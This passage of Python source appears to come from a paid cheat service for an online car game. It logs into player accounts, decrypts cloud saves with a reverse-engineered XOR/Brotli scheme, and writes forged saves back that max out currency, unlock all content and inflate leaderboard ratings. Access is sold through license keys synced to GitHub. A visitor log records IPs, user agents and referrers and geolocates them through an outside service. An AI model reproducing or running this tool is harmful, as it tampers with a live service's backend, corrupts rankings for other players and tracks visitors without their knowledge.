    (13, 'fcar'), (14, 'favouriteWheels'), (15, 'favouriteVinyls'),
    (16, 'favouriteEmojis'), (18, 'emojiPacks'), (41, 'personEquipmentsMale'),
    (42, 'personEquipmentsFemale'), (43, 'platesData'), (44, 'carIDnStatus'),
    (45, 'flags'), (46, 'animations'), (48, 'wheels'),
]
INT_LIST_FIDS = {6, 7, 8, 12, 13, 14, 15, 16, 18, 46, 48}
FLOAT_LIST_FIDS = {10, 11}
EQUIP_FIELDS = ['hair', 'face', 'beard', 'cap', 'mask', 'top',
                'gloves', 'bag', 'pants', 'shoes', 'glasses', 'SelectedEquipments']


def w_i32(v):
    return struct.pack('<i', int(v))


def w_f32(v):
    return struct.pack('<f', float(v))


def w_string(s):
    if s is None:
        return w_i32(-1)
    s = str(s)
    if s == '':
        return w_i32(0)
    bs = s.encode('utf-8')
    return w_i32(-len(bs) - 1) + w_i32(len(s)) + bs


def w_int_list(v):
    v = v or []
    return w_i32(len(v)) + b''.join(w_i32(x) for x in v)


def w_float_list(v):
    v = v or []
    return w_i32(len(v)) + b''.join(w_f32(x) for x in v)


def w_string_list(v):
    v = v or []
    return w_i32(len(v)) + b''.join(w_string(x) for x in v)


def w_equipment(e):
    if not e:
        return b'\x00'
    out = bytearray(b'\x0d')
    for k in EQUIP_FIELDS:
        _vals = e.get(k) or []
        if not _vals:
            out += bytes((255, 255, 255, 255))
        else:
            out += w_i32(len(_vals))
            for _x in _vals:
                out += w_i32(_x)
    out += w_i32(e.get('Gender') or 0)
    return bytes(out)


def w_plates(p):
    if not p:
        return b'\x00'
    out = bytearray(b'\x01')
    plates = p.get('allPlates') or []
    out += w_i32(len(plates))
    for pl in plates:
        out += b'\x04'
        out += w_i32(pl.get('plateId') or 0)
        out += w_i32(pl.get('frontCarId') or 0)
        out += w_i32(pl.get('rearCarId') or 0)
        vinyls = pl.get('vinyls') or []
        out += w_i32(len(vinyls))
        for vy in vinyls:
            out += b'\x04'
            vecs = vy.get('vectors') or []
            out += w_i32(len(vecs))
            for v in vecs:
                out += w_f32(v.get('x') or 0) + w_f32(v.get('y') or 0) + w_f32(v.get('z') or 0)
            out += w_string_list(vy.get('v') or [])
            out += w_float_list(vy.get('floats') or [])
            out += w_string(vy.get('text') or '')
    return bytes(out)


def w_car_status(c):
    if not c:
        return b'\x00'
    out = bytearray(b'\x02')
    out += w_string_list(c.get('carGeneratedIDs') or [])
    out += w_int_list(c.get('carStatus') or [])
    return bytes(out)


def w_dict(d):
    d = d or {}
    items = list(d.items())
    out = bytearray(w_i32(len(items)))
    for k, v in items:
        out += w_i32(int(k))
        out += w_i32(int(v))
    return bytes(out)


def encode_field(fid, value):
    if fid in (1, 3, 5):
        return w_string(value)
    if fid in (2, 4):
        return w_i32(value or 0)
    if fid == 9:
        items = value or []
        out = bytearray(w_i32(len(items)))
        for it in items:
            out += b'\x03'
            out += w_string((it or {}).get('id') or '')
            out += w_string((it or {}).get('Name') or '')
            out += w_string((it or {}).get('accountID') or '')
        return bytes(out)
    if fid in INT_LIST_FIDS:
        return w_int_list(value)
    if fid in FLOAT_LIST_FIDS:
        return w_float_list(value)
    if fid in (41, 42):
        return w_equipment(value)
    if fid == 43:
        return w_plates(value)
    if fid == 44:
        return w_car_status(value)
    if fid == 45:
        return w_dict(value)
    return None


def canon(v):
    try:
        return json.dumps(v, sort_keys=True, ensure_ascii=False, separators=(',', ':'))
    except Exception:
        return str(v)


def _t_b64_of(v):
    if isinstance(v, str) and len(v) > 8:
        return v.strip()
    if isinstance(v, list) and v and all(isinstance(x, str) and len(x) <= 2 for x in v[:80]):
        return ''.join(v)
    return None


def _t_decode(v, uid):
    b = _t_b64_of(v)
    if not b:
        return None
    try:
        raw = base64.b64decode(b + '=' * ((4 - len(b) % 4) % 4))
        out = brotli_decompress(raw)
        if not out:
            out = brotli_decompress(xor_bytes(raw, derive_key(uid or '')))
        return out
    except Exception:
        return None


def _t_parse_f3(out):
    if not out or len(out) < 4:
        return None
    n = struct.unpack('<I', out[:4])[0]
    if len(out) != 4 + 12 * n:
        return None
    arr = []
    for i in range(n):
        x, y, z = struct.unpack('<fff', out[4 + 12 * i:16 + 12 * i])
        arr.append({'x': round(x, 5), 'y': round(y, 5), 'z': round(z, 5)})
    return arr


def _t_parse_f1(out):
    if not out or len(out) < 4:
        return None
    n = struct.unpack('<I', out[:4])[0]
    if len(out) != 4 + 4 * n:
        return None
    return [round(float(x), 5) for x in struct.unpack('<%df' % n, out[4:])]


def _t_parse_i1(out):
    if not out or len(out) < 4:
        return None
    n = struct.unpack('<I', out[:4])[0]
    if len(out) != 4 + 4 * n:
        return None
    return list(struct.unpack('<%di' % n, out[4:]))


def _t_parse_vynils(out):
    if not out or len(out) < 20:
        return None
    D = out
    starts = []
    prev = 6
    i = 0
    ub = struct.unpack_from
    while i < 600:
        # PATCH30：恢复 v3-clone7 原始判定（容差 1.5 + 挑离 prev 最近的候选）
        lo = max(0, prev + 8)
        hi = min(len(D) - 12, prev + 120)
        cand = []
        for o in range(lo, hi):
            x, y, z = ub('<fff', D, o)
            if abs(z - i) < 1.5 and abs(x) < 1.2 and abs(y) < 1.2:
                cand.append(o)
        if not cand:
            break
        o = min(cand, key=lambda c: abs(c - prev))
        starts.append(o)
        prev = o
        i += 1
    if len(starts) < 10:
        return None
    elems = []
    for i in range(len(starts)):
        s = starts[i]
        e = starts[i + 1] if i + 1 < len(starts) else (s + 53)
        if e <= s:
            continue
        px, py, pz = ub('<fff', D, s)
        rx, ry, rz = ub('<fff', D, s + 12)
        ix, iy, iz = ub('<fff', D, s + 24)
        tb = D[s + 36:e]
        tl = struct.unpack('<i', tb[4:8])[0] if len(tb) >= 8 else 0
        tx = ''
        cpos = 8
        if 0 < tl < 64 and len(tb) >= 8 + tl:
            try:
                tx = tb[8:8 + tl].decode('utf-8', 'replace')
                cpos = 8 + tl
            except Exception:
                tx = ''
        col = struct.unpack('<I', tb[cpos:cpos + 4])[0] if len(tb) >= cpos + 4 else 0
        pk = struct.unpack('<i', tb[cpos + 4:cpos + 8])[0] if len(tb) >= cpos + 8 else 0
        ok = True
        for v in (px, py, pz, rx, ry, rz, ix, iy, iz):
            if v != v or abs(v) > 1e6:
                ok = False
                break
        if ok and (abs(px) > 1.5 or abs(py) > 1.5 or not (-1 <= pz <= 600)):
            ok = False
        if ok and (abs(rx) > 400 or abs(ry) > 400 or abs(rz) > 400):
            ok = False
        if ok and (abs(ix) > 5 or abs(iy) > 5 or abs(iz) > 5):
            ok = False
        if ok and ('\ufffd' in tx):
            ok = False
        if not ok:
            continue
        elems.append({
            'position': {'x': px, 'y': py, 'z': float(len(elems))},
            'scaleRotation': {'x': rx, 'y': ry, 'z': rz},
            'iconPosition': {'x': ix, 'y': iy, 'z': iz},
            'text': tx,
            'color': int(col),
            'packedData': int(pk),
        })
    return elems if len(elems) >= 10 else None


def _transcode_car(car, uid):
    car2 = json.loads(json.dumps(car, ensure_ascii=False))
    stats = {}
    for f, fn in (('vectors', _t_parse_f3), ('floats', _t_parse_f1), ('gears', _t_parse_f1),
                  ('typeToInstall', _t_parse_i1), ('BoughtParts', _t_parse_i1), ('fsoData', _t_parse_i1)):
        out = _t_decode(car2.get(f), uid)
        if out:
            parsed = fn(out)
            if parsed:
                car2[f] = parsed
                stats[f] = len(parsed)
    for f in ('Vynils', 'WindowVinyls'):
        out = _t_decode(car2.get(f), uid)
        if out:
            elems = _t_parse_vynils(out)
            if elems:
                if f == 'Vynils':
                    car2[f] = {'allVynils': elems, 'CarID': int(car2.get('CarID') or 0)}
                else:
                    car2[f] = elems
                stats[f] = len(elems)
    return car2, stats


def changed(a, b):
    if a is None and b is None:
        return False
    if a is None or b is None:
        return True
    if isinstance(a, (int, float)) and isinstance(b, (int, float)):
        return a != b
    return canon(a) != canon(b)


def register_account(email, password):
    r = http_post(URL_SIGNUP, {
        'email': email, 'password': password,
        'returnSecureToken': True, 'clientType': 'CLIENT_TYPE_ANDROID',
    })
    if not r:
        return {'ok': False, 'message': '连不上注册服务器，检查网络后重试'}
    if r.get('idToken'):
        return {'ok': True, 'uid': r.get('localId') or ''}
    msg = str(((r.get('error') or {}).get('message')) or '').upper()
    table = [
        ('EMAIL_EXISTS', '邮箱已被注册'),
        ('WEAK_PASSWORD', '密码太弱（至少 6 位）'),
        ('INVALID_EMAIL', '邮箱格式不对'),
        ('OPERATION_NOT_ALLOWED', '注册通道未开启'),
        ('TOO_MANY_ATTEMPTS', '尝试次数太多，稍后再试'),
    ]
    for key, text in table:
        if key in msg:
            return {'ok': False, 'message': text}
    return {'ok': False, 'message': '注册失败：' + (msg or '未知错误')}


def build_packet(rec, orig=None, only=None):
    """构建字段包（仅含变化字段；only 指定字段名白名单）"""
    items = []
    for fid, name in FID_TABLE:
        if only and name not in only:
            continue
        v = rec.get(name)
        if v is None:
            continue
        if orig is not None and not changed(orig.get(name), v):
            continue
        blob = encode_field(fid, v)
        if blob is not None:
            items.append((fid, blob))
    out = bytearray(w_i32(len(items)))
    for fid, blob in items:
        out += struct.pack('<hi', fid, len(blob))
        out += blob
    return bytes(out)


# ------------------------------------------------------------
# 车辆全解锁名单（0..273 去掉特殊编号）
# ------------------------------------------------------------
_CARS_EXCLUDE = {16, 25, 26, 33, 34, 36, 38, 46, 50, 52, 56, 63, 64, 67, 68, 69,
                 71, 72, 73, 75, 78, 79, 80, 83, 84, 90, 91, 92, 93, 94, 95, 96,
                 97, 98, 263, 265, 266, 267, 268}
ALL_CARS = [i for i in range(274) if i not in _CARS_EXCLUDE]

RATING_DATA = {
    'time': 10000000000000000000000, 'cars': 10000000000000000,
    'car_fix': 10000000000000, 'car_collided': 1000000000000,
    'car_exchange': 10000000000000, 'car_trade': 10000000000000,
    'car_wash': 10000000000000, 'slicer_cut': 10000000000000,
    'drift_max': 100000000000000, 'drift': 100000000000000,
    'cargo': 100000, 'delivery': 100000, 'race_win': 300000000000000000000,
    'taxi': 10000000000, 'levels': 10000990000, 'gifts': 1000000000,
    'fuel': 10000000000, 'offroad': 10000000000, 'speed_banner': 1000000000,
    'reactions': 100000000000000000, 'run': 1000000000, 'real_estate': 1000000000,
    't_distance': 10000000000, 'treasure': 10000000000, 'block_post': 10000000000,
    'push_ups': 1000000000000, 'burnt_tire': 10000000000, 'passanger_distance': 100000000,
}


# ------------------------------------------------------------
# 客户端（单账号会话）
# ------------------------------------------------------------
class Client(object):
    def __init__(self):
        self.token = None
        self.refresh = None
        self.uid = None
        self.email = None
        self.password = None
        self.record = None
        self.original = None
        self.lock = threading.Lock()

    # ---- 登录 ----
    def login(self, email, password):
        self.email = email
        self.password = password
        r = http_post(URL_SIGNIN, {
            'email': email, 'password': password,
            'returnSecureToken': True, 'clientType': 'CLIENT_TYPE_ANDROID',
        })
        if not r:
            return {'ok': False, 'message': '连不上登录服务器，检查网络后重试'}
        if r.get('idToken'):
            self.token = r['idToken']
            self.refresh = r.get('refreshToken') or ''
            self.uid = r.get('localId') or ''
            return {'ok': True, 'uid': self.uid}
        msg = str(((r.get('error') or {}).get('message')) or '').upper()
        table = [
            ('EMAIL_NOT_FOUND', '邮箱不存在，检查一下注册邮箱'),
            ('INVALID_LOGIN_CREDENTIALS', '邮箱或密码不对'),
            ('INVALID_PASSWORD', '密码不对'),
            ('INVALID_EMAIL', '邮箱格式不对'),
            ('TOO_MANY_ATTEMPTS', '尝试次数太多，过几分钟再试'),
            ('USER_DISABLED', '这个账号被禁用了'),
            ('API_KEY_INVALID', '登录通道暂时不可用'),
        ]
        for key, text in table:
            if key in msg:
                return {'ok': False, 'message': text}
        return {'ok': False, 'message': '登录失败：' + (msg or '未知错误')}

    def refresh_auth(self):
        if self.refresh:
            try:
                t = http_post(URL_TOKEN, {
                    'grant_type': 'refresh_token',
                    'refresh_token': self.refresh,
                })
                if t and t.get('id_token'):
                    self.token = t['id_token']
                    self.refresh = t.get('refresh_token') or self.refresh
                    return True
            except Exception:
                pass
        if self.email and self.password:
            return bool(self.login(self.email, self.password).get('ok'))
        return False

    def get_auth(self):
        if not self.token and not self.refresh_auth():
            return False
        return True

    # ---- 读档 ----
    def load(self):
        if not self.get_auth():
            return False
        r = http_post(URL_GET, {'data': None}, headers={
            'Authorization': 'Bearer ' + self.token,
        })
        b64 = r.get('result') if isinstance(r, dict) else None
        if not b64:
            self._debug_dump('(no result)', 'GET failed: %s' % str(r)[:600])
            return False
        rec, dbg = decrypt_archive_dbg(b64, self.uid or '', self.password or '', self.email or '')
        if rec:
            self.original = json.loads(json.dumps(rec, ensure_ascii=False))
            self.record = rec
            return True
        self._debug_dump(b64, '\n'.join(dbg))
        return False

    def _debug_dump(self, b64, log_text):
        """解密失败时把密文与诊断日志落盘（仅失败时写，供排查）"""
        try:
            p = os.path.join(HERE, 'debug_archive.txt')
            with open(p, 'w', encoding='utf-8') as f:
                f.write('time: %s\n' % time.strftime('%Y-%m-%d %H:%M:%S'))
                f.write('uid: %s\n' % (self.uid or ''))
                f.write('b64_len: %d\n' % len(str(b64)))
                f.write('b64:\n%s\n\n' % b64)
                f.write('log:\n%s\n' % log_text)
        except Exception:
            pass

    def fetch_fresh(self):
        if not self.load():
            return None
        return json.loads(json.dumps(self.record, ensure_ascii=False))

    # ---- 写回 ----
    def _send(self, rec, orig=None, only=None):
        packet = build_packet(rec, orig, only)
        try:
            comp = brotli_compress(packet, quality=9)
        except Exception as e:
            return {'ok': False, 'message': '压缩失败（Brotli 引擎不可用）：%s' % e}
        enc = xor_bytes(comp, derive_key(self.uid or ''))
        b64 = base64.b64encode(enc).decode('ascii')
        r = http_post(URL_SAVE, {
            'data': {'data': b64, 'deviceId': (self.uid or '')[:8]},
        }, headers={'Authorization': 'Bearer ' + self.token})
        ok = False
        if isinstance(r, dict):
            for key in ('result', 'ok', 'success'):
                if key in r:
                    ok = _ok_flag(r[key])
                    break
        if ok:
            self.original = json.loads(json.dumps(rec, ensure_ascii=False))
            self.record = rec
            return {'ok': True}
        try:
            dbg = json.dumps(r, ensure_ascii=False)
        except Exception:
            dbg = str(r)
        return {'ok': False, 'message': '保存被拒 [调试] ' + dbg[:260]}

    def save(self, rec):
        return self._send(rec, self.original)

    def save_minimal(self, rec, names):
        sub = {n: rec.get(n) for n in names if rec.get(n) is not None}
        if not sub:
            return {'ok': False, 'message': '没有要提交的字段'}
        return self._send(sub, None, names)

    # ---- 修改 ----
    def modify(self, changes):
        rec = self.fetch_fresh()
        if rec is None:
            return {'ok': False, 'message': '读不到存档数据，先点一次「刷新数据」'}
        for k, v in changes.items():
            if k == 'money':
                v = min(int(v), MONEY_MAX)
            elif k == 'coin':
                v = min(int(v), COIN_MAX)
            rec[k] = v
        return self.save(rec)

    def set_floats(self, pairs):
        rec = self.fetch_fresh()
        if rec is None:
            return {'ok': False, 'message': '读不到存档数据，先点一次「刷新数据」'}
        arr = rec.get('floats') or []
        top = max(i for i, _ in pairs)
        while len(arr) <= top:
            arr.append(0.0)
        for i, v in pairs:
            arr[i] = float(v)
        rec['floats'] = arr
        return self.save(rec)

    def set_integers(self, pairs):
        rec = self.fetch_fresh()
        if rec is None:
            return {'ok': False, 'message': '读不到存档数据，先点一次「刷新数据」'}
        arr = rec.get('integers') or []
        top = max(i for i, _ in pairs)
        while len(arr) <= top:
            arr.append(0)
        for i, v in pairs:
            arr[i] = int(v)
        rec['integers'] = arr
        return self.save(rec)

    def set_money(self, v):
        return self.modify({'money': min(int(v), MONEY_MAX)})

    def set_coin(self, v):
        return self.modify({'coin': min(int(v), COIN_MAX)})

    def set_name(self, v):
        return self.modify({'Name': str(v)})

    def set_player_id(self, v):
        return self.modify({'localID': str(v).upper()})

    def set_wins(self, v):
        return self.set_floats([(8, int(v))])

    def set_loses(self, v):
        return self.set_floats([(9, int(v))])

    # ---- 解锁 ----
    def unlock_w16(self):
        return self.set_floats([(32, 1)])

    def unlock_horns(self):
        return self.set_floats([(27, 1), (28, 1), (29, 1), (30, 1), (31, 1)])

    def disable_damage(self):
        return self.set_floats([(34, 1)])

    def unlimited_fuel(self):
        return self.set_floats([(3, 1)])

    def unlock_smoke(self):
        return self.set_floats([(33, 1)])

    def unlock_houses(self):
        return self.set_integers([(8, 1), (110, 1), (111, 1), (112, 1)])

    def complete_levels(self):
        arr = [0.0]
        for n in range(1, 201):
            arr.append(120.0 if n == 43 else 1.0)
        return self.modify({'LevelsDoneTime': arr})

    def unlock_all_cars(self, clear_alldata=False):
        rec = self.fetch_fresh()
        if rec is None:
            return {'ok': False, 'message': '读不到存档数据，先点一次「刷新数据」'}
        s1 = set(rec.get('boughtFsos') or [])
        s1.update(ALL_CARS)
        rec['boughtFsos'] = sorted(s1)
        s2 = set(rec.get('fcar') or [])
        s2.update(ALL_CARS)
        rec['fcar'] = sorted(s2)
        names = ['boughtFsos', 'fcar']
        if clear_alldata:
            rec['allData'] = ''
            names.append('allData')
        return self.save_minimal(rec, names)

    def unlock_wheels(self):
        rec = self.fetch_fresh()
        if rec is None:
            return {'ok': False, 'message': '读不到存档数据，先点一次「刷新数据」'}
        s = set(rec.get('wheels') or [])
        s.update(range(73, 221))
        rec['wheels'] = sorted(s)
        ints = rec.get('integers') or []
        while len(ints) < 113:
            ints.append(0)
        for i in (0, 1, 2, 3, 4, 5, 110, 111, 112):
            ints[i] = 1
        rec['integers'] = ints
        return self.save(rec)

    def unlock_animations(self):
        rec = self.fetch_fresh()
        if rec is None:
            return {'ok': False, 'message': '读不到存档数据，先点一次「刷新数据」'}
        s = set(rec.get('animations') or [])
        s.update(range(0, 301))
        rec['animations'] = sorted(s)
        return self.save(rec)

    def set_rank(self):
        if not self.load():
            return {'ok': False, 'message': '读不到存档数据，先点一次「刷新数据」'}
        if not self.get_auth():
            return {'ok': False, 'message': '登录状态失效，重新登录一下'}
        r = http_post(URL_RATE, {
            'data': json.dumps({'RatingData': RATING_DATA}),
        }, headers={'Authorization': 'Bearer ' + self.token})
        ok = False
        if isinstance(r, dict):
            if 'raw' in r:
                # 404 / HTML 之类：真失败
                ok = False
            else:
                for key in ('result', 'ok', 'success'):
                    if key in r:
                        ok = _ok_flag(r[key])
                        break
                else:
                    ok = False
                # 兼容：result 是 JSON 文本或 null 包装（服务器已受理）
                if not ok:
                    _rv = r.get('result')
                    _s = str(_rv).strip() if _rv is not None else ''
                    if _s and not _s.startswith('<!') and not _s.startswith('<html'):
                        if _s.startswith('{'):
                            try:
                                _inner = json.loads(_s)
                                if isinstance(_inner, dict) and ('data' in _inner or 'callback' in _inner or 'battlepass' in _inner):
                                    ok = True
                            except Exception:
                                pass
                        elif _s in ('null', 'None'):
                            ok = True
        if ok:
            return {'ok': True}
        try:
            dbg = json.dumps(r, ensure_ascii=False)
        except Exception:
            dbg = str(r)
        return {'ok': False, 'message': '排行被拒 [调试] ' + dbg[:260]}

    def fix_account(self):
        rec = self.fetch_fresh()
        if rec is None:
            return {'ok': False, 'message': '读不到存档数据，先点一次「刷新数据」'}
        fixed = 0
        fl = (rec.get('floats') or [])[:54]
        while len(fl) < 54:
            fl.append(0.0)
        new_fl = []
        for v in fl:
            try:
                v = float(v)
            except Exception:
                v = 0.0
            if v == 1:
                new_fl.append(1.0)
            elif v > 1:
                fixed += 1
                new_fl.append(0.0)
            else:
                new_fl.append(v)
        ints = (rec.get('integers') or [])[:120]
        while len(ints) < 120:
            ints.append(0)
        new_ints = []
        for v in ints:
            try:
                v = int(v)
            except Exception:
                v = 0
            if v == 1:
                new_ints.append(1)
            elif v > 1:
                fixed += 1
                new_ints.append(0)
            else:
                new_ints.append(v)
        rec['floats'] = new_fl
        rec['integers'] = new_ints
        r = self.save(rec)
        if r.get('ok'):
            return {'ok': True, 'fixed': fixed}
        return r

    # ---- 一键全解锁 ----
    def unlock_all(self, progress=None):
        steps = [
            ('刷钞票', lambda c: c.set_money(MONEY_MAX)),
            ('刷金币', lambda c: c.set_coin(COIN_MAX)),
            ('W16 引擎', lambda c: c.unlock_w16()),
            ('所有喇叭', lambda c: c.unlock_horns()),
            ('车辆无损', lambda c: c.disable_damage()),
            ('无限汽油', lambda c: c.unlimited_fuel()),
            ('胎烟特效', lambda c: c.unlock_smoke()),
            ('全部动作', lambda c: c.unlock_animations()),
            ('全部轮毂', lambda c: c.unlock_wheels()),
            ('解锁房产', lambda c: c.unlock_houses()),
            ('全关卡通关', lambda c: c.complete_levels()),
            ('全部车辆（请用专用按钮）', lambda c: True),
            ('排行榜拉满', lambda c: c.set_rank()),
        ]
        done = 0
        fails = []
        for i, (name, fn) in enumerate(steps):
            if progress:
                progress(i + 1, len(steps), name)
            try:
                res = fn(self)
            except Exception:
                res = {'ok': False}
            if res and res.get('ok'):
                done += 1
            else:
                fails.append(name)
            time.sleep(0.4)
        return {'ok': True, 'done': done, 'total': len(steps), 'fails': fails}


# ------------------------------------------------------------
# 会话仓库
# ------------------------------------------------------------
SESSIONS = {}
SESSIONS_LOCK = threading.Lock()


def make_session(client, kh='', ptype=''):
    sid = secrets.token_hex(16)
    with SESSIONS_LOCK:
        SESSIONS[sid] = {'client': client, 'ts': time.time(), 'kh': kh or '', 'type': ptype or ''}
    return sid


def get_session(sid):
    with SESSIONS_LOCK:
        ent = SESSIONS.get(sid)
        if ent:
            ent['ts'] = time.time()
        return ent['client'] if ent else None


def check_session_access(sid, access):
    """校验 session 归属：只有创建它的密钥（或管理员）才能操作。
    返回 (ok, message, client)"""
    try:
        sid = str(sid or '')
        with SESSIONS_LOCK:
            ent = SESSIONS.get(sid)
            if not ent:
                return False, '会话不存在或已过期，请重新登录', None
            owner_kh = ent.get('kh') or ''
            owner_type = ent.get('type') or ''
            cli = ent.get('client')
        okk, info = verify_access(access or '')
        # 首页密钥验证关闭：无口令的访客会话也放行
        if not okk:
            with _CFG_LOCK:
                _kg = bool(_CFG.get('key_gate', True))
            if not _kg and not str(access or '').strip():
                return True, '', cli
            return False, '请先输入有效密钥', None
        if info.get('type') == 'admin' or owner_type == 'admin':
            return True, '', cli
        if str(info.get('kh') or '') != str(owner_kh):
            return False, '密钥与当前会话不匹配，请重新登录', None
        return True, '', cli
    except Exception:
        return False, '会话校验失败', None


def drop_session(sid):
    with SESSIONS_LOCK:
        SESSIONS.pop(sid, None)


# ------------------------------------------------------------
# HTTP 服务
# ------------------------------------------------------------

MIME = {
    '.html': 'text/html; charset=utf-8',
    '.js': 'application/javascript; charset=utf-8',
    '.css': 'text/css; charset=utf-8',
    '.svg': 'image/svg+xml',
    '.png': 'image/png',
    '.webp': 'image/webp',
    '.wasm': 'application/wasm',
}


# ============================================================
# 密钥系统（卡密）
#   - 18 位密钥（大写+小写+数字，首次激活后开始计时）
#   - 类型: 1d / 7d / 30d / forever
#   - 数据保存在 keys.json；可选同步到 GitHub 仓库（防丢）
#   - 管理口令: 环境变量 ADMIN_PASS（默认见上方常量）
# ============================================================

_KEY_LOCK = threading.Lock()
_KEYS = {'secret': '', 'keys': {}}


def _norm_key(s):
    """保留大小写，去掉非字母数字字符"""
    return ''.join(ch for ch in str(s or '') if ch.isalnum())


def _key_hash(k):
    return hashlib.sha256(_norm_key(k).encode('utf-8')).hexdigest()[:16]


def _key_hash_alts(k):
    """候选哈希列表：先按原样，再按全大写（兼容旧版纯大写密钥）"""
    out = []
    try:
        out.append(_key_hash(k))
    except Exception:
        pass
    try:
        up = ''.join(ch for ch in str(k or '').upper() if ch.isalnum())
        h2 = hashlib.sha256(up.encode('utf-8')).hexdigest()[:16]
        if h2 not in out:
            out.append(h2)
    except Exception:
        pass
    return out


def _fmt_key(s):
    return s  # 纯字符（不加横杠）


def _gh_headers():
    return {
        'Authorization': 'token ' + GH_TOKEN,
        'Accept': 'application/vnd.github+json',
        'User-Agent': 'cpm-toolbox',
    }


def _gh_http(url, method='GET', payload=None):
    req = urllib.request.Request(url, method=method)
    for k, v in _gh_headers().items():
        req.add_header(k, v)
    if payload is not None:
        req.data = json.dumps(payload).encode('utf-8')
        req.add_header('Content-Type', 'application/json')
    with urllib.request.urlopen(req, timeout=25) as r:
        return json.loads(r.read().decode('utf-8', 'replace'))


def _gh_pull():
    try:
        url = 'https://api.github.com/repos/%s/contents/%s' % (GH_REPO, GH_PATH)
        obj = _gh_http(url, 'GET')
        content = base64.b64decode(obj.get('content') or '').decode('utf-8', 'replace')
        return json.loads(content)
    except Exception as e:
        print('[keys] GitHub 拉取失败: %r' % e)
        return None


def _gh_push(data_str):
    # PATCH42：加重试 + 更清晰的日志；确保密钥真的推到 GitHub，
    # 否则容器重启后本地 keys.json 丢失，会从 GitHub 拉回旧数据，
    # 表现就是「新生成的密钥被自动清理了」。
    for _try in range(3):
        try:
            url = 'https://api.github.com/repos/%s/contents/%s' % (GH_REPO, GH_PATH)
            sha = None
            try:
                sha = _gh_http(url, 'GET').get('sha')
            except Exception:
                pass
            payload = {
                'message': 'update keys.json',
                'content': base64.b64encode(data_str.encode('utf-8')).decode('ascii'),
            }
            if sha:
                payload['sha'] = sha
            r = _gh_http(url, 'PUT', payload)
            if isinstance(r, dict) and (r.get('content') or r.get('sha') or r.get('commit')):
                print('[keys] GitHub 同步完成（第%d次）' % (_try + 1))
                return True
            print('[keys] GitHub 同步返回异常: %s' % str(r)[:120])
        except Exception as e:
            print('[keys] GitHub 同步失败（第%d次）: %r' % (_try + 1, e))
        try:
            time.sleep(1.5)
        except Exception:
            pass
    print('[keys] GitHub 同步彻底失败')
    return False


# ============================================================
# 访客访问日志（PATCH45）
#   访客模式点击「👀 访客模式」时上报一条，管理员可查看。
#   存本地 JSON + 可选同步到 GitHub（同 keys.json 的通道）。
# ============================================================
VISITS_FILE = os.path.join(HERE, 'visits.json')
GH_VISITS_PATH = os.environ.get('GH_VISITS_PATH') or 'visits.json'
_VISITS_LOCK = threading.Lock()
_VISITS = {'items': []}
VISITS_MAX = 2000


def _visits_save(sync=True):
    with _VISITS_LOCK:
        data = json.dumps(_VISITS, ensure_ascii=False, indent=1)
    try:
        tmp = VISITS_FILE + '.tmp'
        with open(tmp, 'w', encoding='utf-8') as f:
            f.write(data)
        os.replace(tmp, VISITS_FILE)
    except Exception as e:
        print('[visits] 本地保存失败: %r' % e)
    if sync and GH_TOKEN and GH_REPO:
        threading.Thread(target=_gh_push_file, args=(GH_VISITS_PATH, data, 'update visits.json'),
                         daemon=True).start()


def _visits_load():
    global _VISITS
    loaded = None
    if os.path.isfile(VISITS_FILE):
        try:
            with open(VISITS_FILE, 'r', encoding='utf-8') as f:
                loaded = json.load(f)
        except Exception as e:
            print('[visits] 本地加载失败: %r' % e)
    if not isinstance(loaded, dict) or not isinstance(loaded.get('items'), list):
        loaded = None
    if loaded is None and GH_TOKEN and GH_REPO:
        loaded = _gh_pull_file(GH_VISITS_PATH)
    if not isinstance(loaded, dict) or not isinstance(loaded.get('items'), list):
        loaded = {'items': []}
    _VISITS = loaded
    print('[visits] 访客日志就绪：%d 条' % len(_VISITS.get('items') or []))


def visit_add(handler, body=None):
    """记录一次访客访问。返回记录 dict。"""
    body = body or {}
    ip = ''
    try:
        ip = (handler.headers.get('X-Forwarded-For') or
              handler.headers.get('X-Real-IP') or
              handler.client_address[0] or '')
    except Exception:
        ip = ''
    if isinstance(ip, str) and ',' in ip:
        ip = ip.split(',')[0].strip()
    ua = ''
    try:
        ua = str(handler.headers.get('User-Agent') or '')[:300]
    except Exception:
        ua = ''
    ref = ''
    try:
        ref = str(handler.headers.get('Referer') or '')[:200]
    except Exception:
        ref = ''
    lang = ''
    try:
        lang = str(handler.headers.get('Accept-Language') or '')[:60]
    except Exception:
        lang = ''
    item = {
        'time': int(time.time()),
        'ip': ip,
        'ua': ua,
        'ref': ref,
        'lang': lang,
        'screen': str(body.get('screen') or '')[:40],
        'platform': str(body.get('platform') or '')[:60],
        'from': str(body.get('from') or 'guest')[:30],
    }
    with _VISITS_LOCK:
        items = _VISITS.setdefault('items', [])
        items.append(item)
        if len(items) > VISITS_MAX:
            del items[:len(items) - VISITS_MAX]
    _visits_save()
    return item


def _ip_geo(ip):
    """查 IP 归属地（免费接口，失败返回空串）。"""
    if not ip:
        return ''
    try:
        if ip.startswith(('127.', '10.', '192.168.', '172.16.', '172.17.', '172.18.', '172.19.',
                          '172.2', '172.30.', '172.31.', '::1', 'localhost')):
            return '内网'
        req = urllib.request.Request('http://ip-api.com/json/%s?lang=zh-CN&fields=status,country,regionName,city,isp' % ip)
        req.add_header('User-Agent', 'cpm-toolbox/1.0')
        with urllib.request.urlopen(req, timeout=6) as r:
            j = json.loads(r.read().decode('utf-8', 'replace'))
        if isinstance(j, dict) and j.get('status') == 'success':
            parts = [str(j.get('country') or ''), str(j.get('regionName') or ''), str(j.get('city') or '')]
            loc = ' '.join([p for p in parts if p])
            if j.get('isp'):
                loc += ' (%s)' % str(j.get('isp'))
            return loc[:80]
    except Exception:
        return ''
    return ''


# ============================================================
# 首页轮播公告（PATCH45）
#   管理员可设置多条滚动内容、字体颜色（渐变风格）、背景（磨砂/半透明）、速度。
# ============================================================
NOTICE_FILE = os.path.join(HERE, 'notice.json')
GH_NOTICE_PATH = os.environ.get('GH_NOTICE_PATH') or 'notice.json'
_NOTICE_LOCK = threading.Lock()
_NOTICE = {
    'enabled': False,
    'items': [],
    'speed': 60,            # px/秒，越大越快
    'fontSize': 14,         # px
    'colorMode': 'gradient',  # gradient | solid
    'color': '#a97bff',
    'gradColor1': '#a97bff',
    'gradColor2': '#ffd479',
    'bgMode': 'frosted',    # frosted | translucent | none
    'bgAlpha': 22,          # 透明度百分比
    'bold': True,
    'updated': 0,
}


def _notice_normalize(raw):
    out = dict(_NOTICE)
    if isinstance(raw, dict):
        for k in out.keys():
            if k in raw:
                out[k] = raw.get(k)
    # 类型兜底
    if not isinstance(out.get('items'), list):
        out['items'] = []
